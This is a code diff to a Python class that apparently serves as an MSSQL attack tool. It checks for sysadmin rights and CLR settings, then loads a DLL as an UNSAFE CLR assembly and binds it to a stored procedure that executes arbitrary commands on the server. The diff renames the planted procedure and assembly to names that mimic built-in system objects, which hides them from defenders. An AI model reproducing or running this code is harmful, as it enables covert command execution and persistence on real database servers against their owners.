@@ -19,12 +19,36 @@ class sql_op:
         self.self_clr = False
         self.clr_status = False
         self.ole_status = False
+        self.clr_security = False
+        self.isdba = False
         self.codec = codec
         self.clr_dll = "bin/Database.dll"
-        self.crl_func_name = "ClrExec"
+        self.procedure_name = "sp_help_text_tables"
+        self.assembly_class_name = "StoredProcedures"
+        self.assembly_method_name = "ClrExec"
+        self.assembly_prefix = "sys_objects_"
+        self.assembly_name = "mssql_log"
         if not self.check_clr():
             print("[!] clr dll not found.")
             sys.exit(-1)
+        self.check_config()
+
+    def check_config(self):
+        sql = "SELECT is_srvrolemember('sysadmin') AS is_dba"
+        row = self.sql_query(sql)
+        if row:
+            if row[0]['is_dba']:
+                self.isdba = True
+        sql = "sp_configure"
+        row = self.sql_query(sql)
+        if row:
+            for r in row:
+                name = r['name']
+                value = r['run_value']
+                if name == "clr enabled" and value == 1:
+                    self.clr_status = True
+                if name == "clr strict security" and value == 0:
+                    self.clr_security = True
         
     def check_clr(self):
         if os.path.exists(self.clr_dll):
@@ -74,7 +98,8 @@ class sql_op:
         return False
 
     def create_assembly(self):
-        command = '''CREATE ASSEMBLY [CLR_module] AUTHORIZATION [dbo] FROM {} WITH PERMISSION_SET = UNSAFE;'''.format(self.clr_payload)
+        assembly_name = self.assembly_prefix + self.assembly_name
+        command = '''IF (exists (SELECT * FROM sys.assemblies WHERE name = '{assembly}')) SELECT 1  ELSE CREATE ASSEMBLY [{assembly}] AUTHORIZATION [dbo] FROM {payload} WITH PERMISSION_SET = UNSAFE;'''.format(assembly=assembly_name, payload=self.clr_payload)
         logging.info("Import the assembly")
         if self.sql_query(command):
             logging.info("Assembly execute done.")
@@ -82,7 +107,7 @@ class sql_op:
         return False
 
     def clr_exec(self, command):
-        sql = "exec dbo.{} \"{}\"".format(self.crl_func_name,command)
+        sql = "exec dbo.{} \"{}\"".format(self.procedure_name,command)
         resp = self.sql_query(sql)
         if resp and type(resp) == list:
             print(list(resp[0].values())[0])
@@ -92,14 +117,13 @@ class sql_op:
 DECLARE @longInput NVARCHAR(MAX) = CAST(N'{}' AS NVARCHAR(MAX));
 DECLARE @sql NVARCHAR(MAX) = N'EXEC dbo.{} ''clr_assembly ' + @longInput + N''';';
 EXEC sp_executesql @sql;
-""".format(command, self.crl_func_name)
+""".format(command, self.procedure_name)
         resp = self.sql_query(sql)
-        if resp and type(resp) == list:
-            print(list(resp[0].values())[0])
-
+        if resp:
+            print(resp)
 
     def create_procedure(self):
-        command = """CREATE PROCEDURE [dbo].[{func}] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [CLR_module].[StoredProcedures].[{func}]""".format(func=self.crl_func_name)
+        command = """CREATE PROCEDURE [dbo].[{procedure}] @arg NVARCHAR (MAX) AS EXTERNAL NAME [{assembly}].[{assembly_class}].[{method}]""".format(procedure=self.procedure_name, assembly= self.assembly_prefix + self.assembly_name, assembly_class= self.assembly_class_name,method=self.assembly_method_name)
         logging.info("Link the assembly to a stored procedure")
         if self.sql_query(command):
             logging.info("Create procedure done.")
@@ -126,7 +150,8 @@ EXEC sp_executesql @sql;
             return False
 
     def drop_crl(self):
-        command = "drop PROCEDURE dbo.{}; drop assembly CLR_module".format(self.crl_func_name)
+        assembly_name = self.assembly_prefix + self.assembly_name
+        command = "drop PROCEDURE dbo.{}; drop assembly {}".format(self.procedure_name, assembly_name)
         logging.info("Drop PROCEDURE and assembly...")
         if self.sql_query(command):
             logging.info("Execute drop crl command done.")
